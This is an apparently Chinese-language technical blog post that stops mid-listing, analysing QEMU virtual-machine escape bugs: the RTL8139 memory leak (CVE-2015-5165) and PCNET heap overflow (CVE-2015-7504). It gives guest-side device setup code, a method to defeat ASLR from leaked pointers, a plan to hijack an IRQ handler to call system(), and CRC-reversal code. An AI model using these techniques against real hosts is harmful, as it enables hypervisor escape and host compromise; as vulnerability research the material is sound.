+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/* ip packet header */</span><br><span class="line">ip_header *ip = NULL;</span><br><span class="line">int hlen = 0;</span><br><span class="line">uint8_t  ip_protocol = 0;</span><br><span class="line">uint16_t ip_data_len = 0;</span><br><span class="line"></span><br><span class="line">uint8_t *eth_payload_data = NULL;</span><br><span class="line">size_t   eth_payload_len  = 0;</span><br><span class="line"></span><br><span class="line">int proto = be16_to_cpu(*(uint16_t *)(saved_buffer + 12));</span><br><span class="line">if (proto == ETH_P_IP)</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(&quot;+++ C+ mode has IP packet\n&quot;);</span><br><span class="line"></span><br><span class="line">    /* not aligned */</span><br><span class="line">    eth_payload_data = saved_buffer + ETH_HLEN;</span><br><span class="line">    eth_payload_len  = saved_size   - ETH_HLEN;</span><br><span class="line"></span><br><span class="line">    ip = (ip_header*)eth_payload_data;</span><br><span class="line"></span><br><span class="line">    if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">        DPRINTF(&quot;+++ C+ mode packet has bad IP version %d &quot;</span><br><span class="line">            &quot;expected %d\n&quot;, IP_HEADER_VERSION(ip),</span><br><span class="line">            IP_HEADER_VERSION_4);</span><br><span class="line">        ip = NULL;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        hlen = IP_HEADER_LENGTH(ip);</span><br><span class="line">        ip_protocol = ip-&gt;ip_p;</span><br><span class="line">        ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen; //计算ip_data_len的时候没有判断ip-&gt;ip_len &lt; hlen</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>IP头包含了上面的两个字段， hlen和ip-&gt;ip_len</p>
+<p>hlen是IP头的长度，这个是固定的20字节，不包括可选字段</p>
+<p>ip-&gt;ip_len是整个包的总长度，包含ip头部的</p>
+<p>而且ip_data_len的类型是uint16_t，即unsigned short int，所以当ip-&gt;ip_len小于hlen，计算出的结果是负数，转化为unsigned short int，那就是一个大整数了，最终导致发送的数据超过实际ip data区的数据，从而实现泄露</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef unsigned short int      uint16_t;</span><br></pre></td></tr></table></figure>
+
+<p>而超过了MTU的长度，会一个chunk一个chunk地传输</p>
+<p>下面是部分代码分成一个一个chunk的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//通过ip_data_len算出tcp_data_len</span><br><span class="line">int tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line">//</span><br><span class="line">int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"></span><br><span class="line">int is_last_frame = 0;</span><br><span class="line"></span><br><span class="line">for (tcp_send_offset = 0; tcp_send_offset &lt; tcp_data_len;</span><br><span class="line">    tcp_send_offset += tcp_chunk_size) &#123;</span><br><span class="line">    uint16_t chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">    /* check if this is the last frame */</span><br><span class="line">    if (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len) &#123;</span><br><span class="line">        is_last_frame = 1;</span><br><span class="line">        chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    memcpy(data_to_checksum, saved_ip_header + 12, 8);</span><br><span class="line"></span><br><span class="line">    if (tcp_send_offset) &#123;</span><br><span class="line">        memcpy((uint8_t*)p_tcp_hdr + tcp_hlen,</span><br><span class="line">                (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset,</span><br><span class="line">                chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* more code follows */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们发送一个恶意的数据包包含特殊的长度（比如ip-&gt;ip_len = hlen - 1），ip_data_len是unsigned short int，所以可以泄露0xffff个字节，那就是我们可以泄露约64KB的内存，收到约43个数据包，因为mtu一般1500。</p>
+<h2 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h2><p>为了发送格式错误的数据包并读取泄漏的数据，我们需要配置第一个Rx和Tx描述符缓冲区，并设置一些<br>标志位，以便进入易受攻击的代码路径。</p>
+<p>下面是RTL8139漏洞相关的寄存器</p>
+<p><img src="http://pic.giantbranch.cn/pic/1561794542007.jpg" alt></p>
+<ul>
+<li>TxConfig: Enable/disable Tx flags 比如 TxLoopBack (开启 loopback测试模式<br>test mode), TxCRC (不添加CRC校验码的 Tx 包), etc.</li>
+<li>RxConfig: Enable/disable Rx flags 比如 AcceptBroadcast (接收广播包), AcceptMulticast (接收组播包), etc.</li>
+<li>CpCmd: C+ 命令寄存器用来开启一些函数如下：<br>CplusRxEnd (enable receive), CplusTxEnd (enable transmit), etc.</li>
+<li>TxAddr0:  Tx descriptors table的物理地址.</li>
+<li>RxRingAddrLO:  Rx descriptors 低32位的物理地址<br>table.</li>
+<li>RxRingAddrHI:  Rx descriptors 高32位的地址<br>table.</li>
+<li>TxPoll: 让网卡检查Tx descriptors.</li>
+</ul>
+<p>一个Rx/Tx-descriptor就是下面的结构：<br>buf_lo和buf_hi就是 Tx/Rx 的物理地址的低32和高32位，它们指向发送/接收数据包的缓冲区，必须与页面大小对齐。变量dw0编码了缓冲区的大小还有额外的标记位，比如用来标记缓冲区归网卡还是驱动所有。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct rtl8139_desc &#123;</span><br><span class="line">    uint32_t dw0;</span><br><span class="line">    uint32_t dw1;</span><br><span class="line">    uint32_t buf_lo;</span><br><span class="line">    uint32_t buf_hi;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>网卡通过in<em>() 和out</em>()进行配置  (from sys/io.h)，我们需要有CAP_SYS_RAWIO权限</p>
+<p>下面的代码片段配置网卡，并设置单个Tx描述符</p>
+<p>struct rtl8139_desc {<br>    uint32_t dw0;<br>    uint32_t dw1;<br>    uint32_t buf_lo;<br>    uint32_t buf_hi;<br>};</p>
+<p>网卡的设置通过 in<em>() out</em>() 原语来配置 (from<br>sys/io.h). 而且我们需要 CAP_SYS_RAWIO 权限才能配置. 下面的代码片段配置了网卡还有初始化了一个Tx descriptor。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#define RTL8139_PORT        0xc000</span><br><span class="line">#define RTL8139_BUFFER_SIZE 1500</span><br><span class="line"></span><br><span class="line">struct rtl8139_desc desc;</span><br><span class="line">void *rtl8139_tx_buffer;</span><br><span class="line">uint32_t phy_mem;</span><br><span class="line"></span><br><span class="line">// 申请对齐的内存，并将返回值转化为物理地址</span><br><span class="line">rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">phy_mem = (uint32)gva_to_gpa(rtl8139_tx_buffer);</span><br><span class="line"></span><br><span class="line">memset(&amp;desc, 0, sizeof(struct rtl8139_desc));</span><br><span class="line"></span><br><span class="line">// 设置Tx descriptor 的dw0，包括缓冲区大小和一些标志位</span><br><span class="line">desc-&gt;dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN |</span><br><span class="line">             CP_TX_IPCS | CP_TX_TCPCS;</span><br><span class="line">desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line"></span><br><span class="line">//设置低32位</span><br><span class="line">desc.buf_lo = phy_mem;</span><br><span class="line"></span><br><span class="line">iopl(3);</span><br><span class="line"></span><br><span class="line">outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line"></span><br><span class="line">outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line"></span><br><span class="line">outl(phy_mem, RTL8139_PORT + TxAddr0);</span><br><span class="line">outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用代码设置了网卡的寄存器还有Tx 和 Rx buffer descriptors，之后发一个异常格式的数据包到网卡的MAC地址，这样我们就可以通过访问Rx缓冲区来读取泄露的数据了</p>
+<p>泄露的数据中有几个函数指针，而他们是同一个QEMU内部结构的成员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct ObjectProperty</span><br><span class="line">&#123;</span><br><span class="line">    gchar *name;</span><br><span class="line">    gchar *type;</span><br><span class="line">    gchar *description;</span><br><span class="line">    ObjectPropertyAccessor *get;</span><br><span class="line">    ObjectPropertyAccessor *set;</span><br><span class="line">    ObjectPropertyResolve *resolve;</span><br><span class="line">    ObjectPropertyRelease *release;</span><br><span class="line">    void *opaque;</span><br><span class="line"></span><br><span class="line">    QTAILQ_ENTRY(ObjectProperty) node;</span><br><span class="line">&#125; ObjectProperty;</span><br></pre></td></tr></table></figure>
+
+<p>应该说是这几个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ObjectPropertyAccessor *get;</span><br><span class="line">ObjectPropertyAccessor *set;</span><br><span class="line">ObjectPropertyResolve *resolve;</span><br><span class="line">ObjectPropertyRelease *release;</span><br></pre></td></tr></table></figure>
+
+<p>qemu遵循对象模型来管理设备，内存区域等，qemu启动的时候，会创建多个对象并为其分配属性。</p>
+<p>比如下面的函数会给一个内存区域对象真机一个may-overlap的属性，这个属性有一个getter方法去获取这个属性的布尔值</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">object_property_add_bool(OBJECT(mr), <span class="string">"may-overlap"</span>,</span><br><span class="line">                         memory_region_get_may_overlap,</span><br><span class="line">                         <span class="literal">NULL</span>, <span class="comment">/* memory_region_set_may_overlap */</span></span><br><span class="line">                         &amp;error_abort);</span><br></pre></td></tr></table></figure>
+
+<p>RTL8139网卡设备仿真器 在堆上用一个64KB的内存来重新组装数据包。而这个64K的buffer有很大机会把free掉了的object properties的内存占位了</p>
+<p>在漏洞利用中，我们在泄漏的内存中搜索已知的对象属性。更确切地说，我们正在寻找80字节的内存块（块的大小为已经free掉的ObjectProperty结构，80加上堆头16，就是96，即0x60），其中至少有一个函数指针（get, set, resolve or release），即使开了ASLR，我们仍然可以获得.text部分的基地址。实际上，他们的页面偏移是固定的（12个最低有效位不是随机的），我们可以通过一些简单的计算获得qemu一些有用的函数的地址，我们也可以得到libc的一些地址，比如mprotect() 和 system() 的地址</p>
+<p>我们还注意到地址PHY_MEM + 0x78泄漏了几次，其中PHY_MEM是给guest虚拟机分配的物理内存的起始地址</p>
+<p>exp就是搜索泄露的内存数据并尝试解析，.text段的虚拟地址，以及物理内存的基址</p>
+<p>这个可能需要一行一行的读代码才能好理解</p>
+<p>我们可以通过build-exploit.sh，生成的各种函数的相对偏移，之后替换掉qemu.h，再编译cve-2015-5165.c即可</p>
+<p>实验结果：</p>
+<p><img src="http://pic.giantbranch.cn/pic/1562747572213.jpg" alt></p>
+<h1 id="堆溢出的利用"><a href="#堆溢出的利用" class="headerlink" title="堆溢出的利用"></a>堆溢出的利用</h1><p>这个小节是讨论CVE-2015-7504，同时提供控制rip的exp</p>
+<h2 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>AMD PCNET网卡模拟器在本地回环测试模式下收到大的数据包时存在堆溢出漏洞，PCNET模拟器保留了4Kb（4096 bytes）的buffer来存储数据包。如果Tx descriptor buffer上的ADDFCS标志位是开启的，网卡会在收到的数据包后面添加一个CRC校验码，这个是在hw/net/pcnet.c里面的pcnet_receive()函数实现的。</p>
+<p>收到的数据包小于（4096 - 4）个bytes是没有问题的，但是数据包刚好是4096个bytes，我们就可以溢出这个buffer 4个字节的大小了</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *src = s-&gt;buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!s-&gt;looptest) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(src, buf, size);</span><br><span class="line">    <span class="comment">/* no need to compute the CRC */</span></span><br><span class="line">    src[size] = <span class="number">0</span>;</span><br><span class="line">    src[size + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    src[size + <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    src[size + <span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    size += <span class="number">4</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (s-&gt;looptest == PCNET_LOOPTEST_CRC ||</span><br><span class="line">           !CSR_DXMTFCS(s) || size &lt; MIN_BUF_SIZE+<span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> fcs = ~<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> *p = src;</span><br><span class="line">	<span class="comment">// 没到字符串结尾就不断调用CRC</span></span><br><span class="line">    <span class="keyword">while</span> (p != &amp;src[size])</span><br><span class="line">        CRC(fcs, *p++);</span><br><span class="line">	<span class="comment">//将CRC的结果放到字符串后面</span></span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)p = htonl(fcs);</span><br><span class="line">    size += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上面的代码中s指向PCNET结构体，我们看看这个结构体，buffer后面就是irq，我们可以覆盖irq变量的值</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCNetState_st</span> &#123;</span></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line">    QEMUTimer *poll_timer;</span><br><span class="line">    <span class="keyword">int</span> rap, isr, lnkst;</span><br><span class="line">    <span class="keyword">uint32_t</span> rdra, tdra;</span><br><span class="line">    <span class="keyword">uint8_t</span> prom[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint16_t</span> csr[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">uint16_t</span> bcr[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> xmit_pos;</span><br><span class="line">    <span class="keyword">uint64_t</span> timer;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    <span class="keyword">void</span> (*phys_mem_read)(<span class="keyword">void</span> *dma_opaque, hwaddr addr,</span><br><span class="line">                          <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> do_bswap);</span><br><span class="line">    <span class="keyword">void</span> (*phys_mem_write)(<span class="keyword">void</span> *dma_opaque, hwaddr addr,</span><br><span class="line">                           <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> do_bswap);</span><br><span class="line">    <span class="keyword">void</span> *dma_opaque;</span><br><span class="line">    <span class="keyword">int</span> tx_busy;</span><br><span class="line">    <span class="keyword">int</span> looptest;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>变量irq是一个指IRQState结构体的指针，而这个指针里面第二是一个handler</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> *<span class="title">qemu_irq</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*qemu_irq_handler)</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">int</span> n, <span class="keyword">int</span> level)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line">    qemu_irq_handler handler;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>而这个handler会被PCNET网卡模拟器调用多次。比如，在pcnet_receive()的末尾，调用了pcnet_update_irq()，这个函数里面调用了qemu_set_irq()，在qemu_set_irq中就调用了irq中的handler</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void qemu_set_irq(qemu_irq irq, int level)</span><br><span class="line">&#123;</span><br><span class="line">    if (!irq)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以要利用这个漏洞，我们需要：</p>
+<ul>
+<li><p>伪造一个假的IRQState结构体，比如里面包含指向system函数的handler </p>
+</li>
+<li><p>获得这个假的IRQState结构体的精确地址。有了之前的信息泄露，我们可以算出它在qemu进程的内存地址（这是在guest虚拟机的物理内存基址再加上一个偏移）</p>
+</li>
+<li><p>伪造一个4K的恶意数据包（即4096字节）.</p>
+</li>
+<li><p>修改数据包，使得计算出来的CRC刚好指向我们构造的假的IRQState结构体</p>
+</li>
+<li><p>最后就发送这个数据包即可</p>
+</li>
+</ul>
+<p>但PCNET网卡收到数据包，它会通过pcnet_receive函数处理执行以下操作：</p>
+<ul>
+<li>复制收到的数据包到buffer变量</li>
+<li>计算CRC并追加到buffer后面，那么就会溢出buffer4个bytes，覆盖了irq变量</li>
+<li>调用 pcnet_update_irq()，里面再调用 qemu_set_irq() ，在里面就调用irq变量里面的handler，那么我我们的handler就会执行了</li>
+</ul>
+<p>请注意，irq是我们伪造的，所以我们可以控制irq-&gt;handler的前两个参数 (irq-&gt;opaque and irq-&gt;n), 感谢一个小技巧，我们也可以控制第三个参数（level），这对于调用mprotect函数来说是必须的。</p>
+<p>还需要注意的是我们是用4字节覆盖一个8字节的指针，覆盖的是低4字节，在我们的测试环境中我们可以成功控制rip寄存器。然而这会在没有在编译时设置CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE标志的内核上会出问题。</p>
+<h2 id="设置网卡"><a href="#设置网卡" class="headerlink" title="设置网卡"></a>设置网卡</h2><p>在进一步研究之前，我们需要设置PCNET网卡需要的flags，Tx 和 Rx 描述缓冲区，还有环形缓冲区，以便能够发送和接收数据包。</p>
+<p>AMD PCNET网卡可以以16位模式或者32位模式进行访问。这个取决于DWI0的值（这个值储存在网卡中），下面我们深入PCNET网卡在16位模式下的主要寄存器，因为16位模式网卡重置后的默认模式。</p>
+<p><img src="http://pic.giantbranch.cn/pic/1562919332068.jpg" alt></p>
+<p>通过访问reset寄存器可以将卡重置为默认状态。</p>
+<p>PCNET网卡有两种内部寄存器：CSR (Control and Status Register 控制和状态寄存器) and BCR (Bus Control Registers 总线控制寄存器)。两个寄存器都需要在RAP(Register Address Port) 寄存器设置我们要访问的寄存器索引才能访问。比如我们想初始化并重启网卡，我们需要将CSR0的bit0和bit1设置为1，这个我们可以通过写入0到RAP寄存器去选择CSR0，之后设置CSR为0x3，(即二进制的0b11),如下面代码所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outw(0x0, PCNET_PORT + RAP);</span><br><span class="line">outw(0x3, PCNET_PORT + RDP);</span><br></pre></td></tr></table></figure>
+
+<p>网卡的配置可以通过初始化一个下面的结构体之后传递这个结构体的物理地址给网卡（需要通过CSR1和CSR2寄存器完成）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct pcnet_config &#123;</span><br><span class="line">    uint16_t  mode;      /* working mode: promiscusous, looptest, etc. */</span><br><span class="line">    uint8_t   rlen;      /* number of rx descriptors in log2 base */</span><br><span class="line">    uint8_t   tlen;      /* number of tx descriptors in log2 base */</span><br><span class="line">    uint8_t   mac[6];    /* mac address */</span><br><span class="line">    uint16_t _reserved;</span><br><span class="line">    uint8_t   ladr[8];   /* logical address filter */</span><br><span class="line">    uint32_t  rx_desc;   /* physical address of rx descriptor buffer */</span><br><span class="line">    uint32_t  tx_desc;   /* physical address of tx descriptor buffer */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="逆向CRC"><a href="#逆向CRC" class="headerlink" title="逆向CRC"></a>逆向CRC</h2><p>就像前面所说的，我们需要填充数据包，使得计算出来的CRC能够指向我们伪造的IRQState结构体。</p>
+<p>幸运的是，CRC是可逆的，只需要打一个4字节的补丁即可让他设置成我们想要设置的任何值</p>
+<p>下面的源码reverse-crc.c，打了一个4字节的补丁，使得CRC计算出来是0xdeadbeef</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">---[ reverse-crc.c ]---</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">#define CRC(crc, ch)	 (crc = (crc &gt;&gt; <span class="number">8</span>) ^ crctab[(crc ^ (ch)) &amp; <span class="number">0xff</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">/* generated using the AUTODIN II polynomial</span></span><br><span class="line"><span class="comment"> *	x^32 + x^26 + x^23 + x^22 + x^16 +</span></span><br><span class="line"><span class="comment"> *	x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">static const uint32_t crctab[<span class="number">256</span>] = &#123;</span><br><span class="line">	<span class="number">0x00000000</span>, <span class="number">0x77073096</span>, <span class="number">0xee0e612c</span>, <span class="number">0x990951ba</span>,</span><br><span class="line">	<span class="number">0x076dc419</span>, <span class="number">0x706af48f</span>, <span class="number">0xe963a535</span>, <span class="number">0x9e6495a3</span>,</span><br><span class="line">	<span class="number">0x0edb8832</span>, <span class="number">0x79dcb8a4</span>, <span class="number">0xe0d5e91e</span>, <span class="number">0x97d2d988</span>,</span><br><span class="line">	<span class="number">0x09b64c2b</span>, <span class="number">0x7eb17cbd</span>, <span class="number">0xe7b82d07</span>, <span class="number">0x90bf1d91</span>,</span><br><span class="line">	<span class="number">0x1db71064</span>, <span class="number">0x6ab020f2</span>, <span class="number">0xf3b97148</span>, <span class="number">0x84be41de</span>,</span><br><span class="line">	<span class="number">0x1adad47d</span>, <span 